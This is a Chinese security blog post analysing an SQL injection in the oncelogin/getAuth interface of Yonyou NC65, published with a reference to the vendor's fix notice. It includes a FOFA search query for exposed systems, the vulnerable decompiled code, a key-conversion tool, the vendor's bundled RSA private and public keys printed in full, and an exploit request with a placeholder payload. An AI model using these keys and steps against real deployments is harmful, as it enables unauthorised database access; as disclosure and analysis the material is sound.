---
title: "用友NC oncelogin/getAuth SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oncelogin-getAuth-sqli.html
asset_dir: assets/用友nc-oncelogingetauth-sql注入漏洞
---

# 用友NC oncelogin/getAuth SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/12 14:14
- 974浏览
- [0评论](#comment)
- 1小时阅读

深入探索

身份验证

软件

安全

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统的 oncelogin/getAuth 接口存在 [SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意的 SQL 语句注入请求参数，绕过身份验证或获取数据库敏感信息，进而可能导致任意数据读取、篡改甚至系统权限提升，影响系统的安全性和数据完整性。

SQL注入防护

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据漏洞通告可知[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)点在**oncelogin**

深入探索

安全认证考试

传输层安全性协议

漏洞修复方案

[![用友NC oncelogin/getAuth SQL注入漏洞](images/img-001-c4c88fa4b29f.webp)](https://image.mrxn.net/022ef974714047d4bce5d65c3551426a.webp)

直接看`OnceLoginAction`类的`getAuth`方法的实现逻辑吧

代码安全审计

```
@Servlet(path="/oncelogin")
public class OnceLoginAction
extends BaseAction {
....
@Action
public void getAuth() throws BusinessException {
    String key = "serverPathOK";
    JSONObject jsonRoot = this.buidJSON(key, null);
    String param = this.request.getParameter("param");
    param = RSACrypto.getInstance().decipher(param);
    String user_code = null;
    if (param.contains("user_code")) {
        user_code = param.substring(param.indexOf("user_code=") + 10, param.indexOf("&"));
    }
    if (StringUtils.isEmpty(user_code)) {
        return;
    }
    String serverPathOK = "";
    String path = CommonUtils.getServerPath();
    PersonsynVO ps = ((IPersonsynQueryService)NCLocator.getInstance().lookup(IPersonsynQueryService.class)).queryPersonsynByImUserName(user_code);
```

参数param首先需要经过`RSACrypto.getInstance().decipher`解密，跟进RSA的`decipher`方法看下

漏洞扫描服务

## RSA加解密

```
public String decipher(String content) {
    InputStream fis = null;
    ObjectInputStream ois = null;
    try {
        if (content == null || content.equals("")) {
            String string = null;
            return string;
        }
        byte[] base64Code = Base64.decodeBase64((byte[])content.getBytes("UTF-8"));
        BigInteger c = new BigInteger(base64Code);
        fis = RSACrypto.class.getResourceAsStream("Skey_RSA_PRIV.dat");
        ois = new ObjectInputStream(fis);
        RSAPrivateKey prk = (RSAPrivateKey)ois.readObject();
        BigInteger d = prk.getPrivateExponent();
        BigInteger n = prk.getModulus();
        BigInteger m = c.modPow(d, n);
        String string = new String(m.toByteArray(), "UTF-8");
        return string;
    }
```

根据代码的`ObjectInputStream`可知：

- `Skey_RSA_PRIV.dat` 文件里存储的是一个`RSAPrivateKey`对象的序列化结果。
- 可以通过Java反序列化直接还原出`RSAPrivateKey`对象。

现在是去找到这个序列化的私钥，然后还原成我们常见的证书格式如-----BEGIN PRIVATE KEY-----这种，根据decipher的方法包路径 `/nc/bs/oa/oaco/im/RSACrypto.java` 直接在用友 `/modules/oaco/lib` 目录下的 `puboaco_instantmessage.jar` 包找到了 `Skey_RSA_PRIV.dat` 和 `Skey_RSA_PUB.dat`

[![用友NC oncelogin/getAuth SQL注入漏洞](images/img-002-061aaa2b1a76.webp)](https://image.mrxn.net/6275fa85b25e485bad65504bda8696e5.webp)

查看下内容，果然是序列化的对象

编程

[![用友NC oncelogin/getAuth SQL注入漏洞](images/img-003-963a08328c2b.webp)](https://image.mrxn.net/947c329b95704dc6a7f5a3f2f3b81314.webp)

ok,找到了，我们让AI写一个java来还原

网络安全

```
import java.io.*;
import java.security.Key;
import java.util.Base64;

public class NC_RSA_KEY_CONVERT {
    public static void main(String[] args) {
        String filename = "Skey_RSA_PUB.dat";
        if (args.length > 0 && args[0] != null && !args[0].trim().isEmpty()) {
            filename = args[0];
        }
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            Object obj = ois.readObject();
            if (obj instanceof Key) {
                Key key = (Key) obj;
                System.out.println("算法名 (Algorithm): " + key.getAlgorithm());
                System.out.println("编码格式 (Format): " + key.getFormat());
                System.out.println("类型 (Type): " + key.getClass().getSimpleName());
                byte[] encoded = key.getEncoded();

                // 输出PEM格式
                String base64 = Base64.getEncoder().encodeToString(encoded);
                String type = getPemType(filename);
                System.out.println("\n-----BEGIN " + type + " KEY-----");
                printPem(base64);
                System.out.println("-----END " + type + " KEY-----");
            } else {
                System.out.println("不是Key类型，实际类型是: " + obj.getClass().getName());
            }
        } catch (Exception e) {
            System.err.println("读取或解析失败: " + e);
            e.printStackTrace();
        }
    }

    private static String getPemType(String filename) {
        String upper = filename.toUpperCase();
        if (upper.contains("PUB")) {
            return "PUBLIC";
        } else if (upper.contains("PRIV")) {
            return "PRIVATE";
        } else {
            return "";
        }
    }

    private static void printHex(byte[] data) {
        for (int i = 0; i < data.length; i++) {
            System.out.printf("%02X", data[i]);
            if ((i + 1) % 16 == 0) System.out.println();
            else System.out.print(" ");
        }
        System.out.println();
    }

    private static void printPem(String base64) {
        int lineLen = 64;
        for (int i = 0; i < base64.length(); i += lineLen) {
            int end = Math.min(i + lineLen, base64.length());
            System.out.println(base64.substring(i, end));
        }
    }
}
```

然后 `javac NC_RSA_KEY_CONVERT.java` 编译，再执行 `java NC_RSA_KEY_CONVERT Skey_RSA_PRIV.dat` 即可得到常见rsa证书格式

数据管理

```
tmp# java NC_RSA_KEY_CONVERT Skey_RSA_PRIV.dat
算法名 (Algorithm): RSA
编码格式 (Format): PKCS#8
类型 (Type): RSAPrivateCrtKeyImpl

-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJfmPzz4SmfMMNcG
WX3J4EyBrAsB33rTQ/JmFFWac34Y2Irrvfd8qRrcseJwFlIGGjg3lCerpHGPy4P4
BN4Wpzj4mHBycgvjRkmb8omVqnpZBtv1Lr3tuTrOIV4oeXI/93/8IbbU4VScPX6X
S6pZpKoYhl4u2hbiTxsnc+Rjh+eXAgMBAAECgYEAlhr+5QZLqNUccnCg4PAsyg3e
cKYyLNM3MwPzFkDh3ns5Cdc6S6YSCiyLUMQJGpdTM7ignK8+esZpjAj87mceaWVR
y+or+9uBwzaWaJCf6FRKzFFapekLhzRuWT4OiqwG5bPpf9hogVMKf4DXg+FIzgTt
kHM9VcYLhWwvifULFbkCQQDJrHyuVsfXAVlKffTZIVBnD+ykfTzFXwTgVWuqwVQy
mSsbzULbcsOkR1F4mmecdkz4uPmezjNuSsBAizgbVy4FAkEAwNFMC7OM2JhJRLFs
TGYXFdEQWkyLCX2VfWL31G8sEBsG6x/YXajbPrHvhVo6N6Z6gs2/QRawDGs+G0DE
I6VV6wJBAMPsIiRsgjBKSyinPRtD1gyJ1+flEwjbyqz1z2dP8jBFxS95NZ5j29TY
xDlaJ5ZFB3oKmdbBlA1t6V/K4HMPOtECQHWbs8y3WcOLL7WMmsgGxTHzcQwDABNr
3FC8mvmiTbgNJC0qIWkPY5tcIQKvxC7JhpReNrfWxM7uYtVwrbIoWL0CQCdyASkB
HbmomKnm+gyixwsD2j6uMpliQ3//ZjJWLo7IVzk6OrQFCOjcE91IB+BLo014h1Ro
P6/ZCPAeaFCVlAg=
-----END PRIVATE KEY-----
```

以及公钥（我们加密需要）

安全运维咨询

```
tmp# java NC_RSA_KEY_CONVERT Skey_RSA_PUB.dat
算法名 (Algorithm): RSA
编码格式 (Format): X.509
类型 (Type): RSAPublicKeyImpl

-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCX5j88+EpnzDDXBll9yeBMgawL
Ad9600PyZhRVmnN+GNiK6733fKka3LHicBZSBho4N5Qnq6Rxj8uD+ATeFqc4+Jhw
cnIL40ZJm/KJlap6WQbb9S697bk6ziFeKHlyP/d//CG21OFUnD1+l0uqWaSqGIZe
LtoW4k8bJ3PkY4fnlwIDAQAB
-----END PUBLIC KEY-----
```

继续往下看

## SQL注入

```
String user_code = null;
if (param.contains("user_code")) {
    user_code = param.substring(param.indexOf("user_code=") + 10, param.indexOf("&"));
}
if (StringUtils.isEmpty(user_code)) {
    return;
}
String serverPathOK = "";
String path = CommonUtils.getServerPath();
PersonsynVO ps = ((IPersonsynQueryService)NCLocator.getInstance().lookup(IPersonsynQueryService.class)).queryPersonsynByImUserName(user_code);
```

参数`param`值经过解密后，判断是否包含`user_code`，如果不包含就会直接退出，否则提取`user_code=`后至`&`之间的内容带入`queryPersonsynByImUserName`方法，跟进`queryPersonsynByImUserName`方法看下它的实现

SQL注入防护

```
public PersonsynVO queryPersonsynByImUserName(String imUserName) throws BusinessException {
    String whereCondStr = "imname='" + imUserName + "'";
    Collection personsyns = this.getOaQueryService().queryBillOfVOByCond(PersonsynVO.class, whereCondStr, true);
    if (personsyns != null && personsyns.size() > 0 && personsyns.iterator().hasNext()) {
        return (PersonsynVO)personsyns.iterator().next();
    }
    return null;
}
```

到这里，整个漏洞形成原因也就明了了，参数`param`值经过解密后提取`user_code=`后至`&`之间的内容被直接拼接在`imname='` 后面，无任何过滤或校验，因此造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 需注意NC65 大多数为Oracle 少数MSSQL
>
> 代码安全审计

将payload使用rsa公钥加密

[![用友NC oncelogin/getAuth SQL注入漏洞](images/img-004-b623ea1f4b2a.webp)](https://image.mrxn.net/625066eab162433091465d4dfd4204a9.webp)

出击！

```
POST /portal/pt/oncelogin/getAuth?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

param=RSA_ENC_SQLI_POC
```

[![用友NC oncelogin/getAuth SQL注入漏洞](images/img-005-e3c893ee0413.webp)](https://image.mrxn.net/308811c79964404f9ca178ec30207103.webp)

通过报错注入成功在响应回显当前数据库用户！

漏洞扫描服务

PS: 也属于老洞了,其实在年初就检测到有此漏洞攻击，一直懒 没看-\_- 不过官方发公告了，那我也就浅析下。

其他用友相关漏洞分析：<https://mrxn.net/?keyword=%E7%94%A8%E5%8F%8B>

# 参考

- [关于NC系统oncelogin getAuth 接口存在sql注入漏洞的修复通告](https://security.yonyou.com/#/noticeInfo?id=726)

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.RSA加解密](#toc-4-1-)
- [4.2.SQL注入](#toc-4-2-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
